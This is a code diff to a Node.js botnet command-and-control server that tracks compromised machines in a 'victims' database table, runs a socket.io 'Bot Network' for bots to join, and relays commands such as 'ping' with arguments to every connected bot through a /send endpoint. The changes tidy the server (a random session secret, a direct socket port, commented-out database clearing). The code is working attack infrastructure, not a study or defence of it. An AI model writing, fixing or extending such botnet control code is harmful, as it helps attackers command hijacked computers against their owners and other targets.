@@ -7,9 +7,11 @@ import chalk from "chalk";
 import { superBase } from "./superBaseAPI.js";
 import session from "express-session";
 import FileStore  from "session-file-store";
+import crypto from "node:crypto";
+
 
 // Clearing the database
-superBase.from("victims")
+await  superBase.from("victims")
     .delete()
     .like("ID","%")
 
@@ -25,12 +27,11 @@ let adminSoc = null;
 let victim = null
 // Variables
 
-
 // Express
 const app = express()
 app.use(session({
     store: new File_Store(),
-    secret: "keyboard cat",
+    secret: crypto.randomBytes(16).toString('hex'),
     resave: false,
     cookie: { maxAge: 1000 * 60 * 60 * 24 },
     saveUninitialized: true
@@ -90,6 +91,7 @@ app.post("/send",async(req,res)=>{
     }
 
     if(req.body.emit == "ping"){
+        // console.log(req.body.args)
         botIo.emit("ping",req.body.args)
         // ids.forEach(id=>{
         //     botIo.sockets.sockets.get(id).emit("ping",req.body.args)
@@ -109,9 +111,8 @@ app.post("/send",async(req,res)=>{
 })
 
 
-const botnet = express().listen(portB,ipB, () => {
-    console.log(`Bot Network listening on http://${ipB}:${portB}/`)
-})    
+// const botnet = express().listen(portB,ipB, () => {
+// })    
 
 const masterServer = app.listen(portM,ipM, () => {
     console.log(`Master Network listening on http://${ipM}:${portM}/`)
@@ -119,12 +120,14 @@ const masterServer = app.listen(portM,ipM, () => {
 
 
 // Socket io Connection for BOTS
-const botIo = new Server(botnet);
+const botIo = new Server(portB)
+console.log(`Bot Network listening on http://${ipB}:${portB}/`)
+
 botIo.on("connection",async (socket)=>{
     // Clearing the database
-    superBase.from("victims")
-        .delete()
-        .like("ID","%")
+    // superBase.from("victims")
+    //     .delete()
+    //     .like("ID","%")
 
 
     var data = JSON.parse(socket.handshake.query.info)
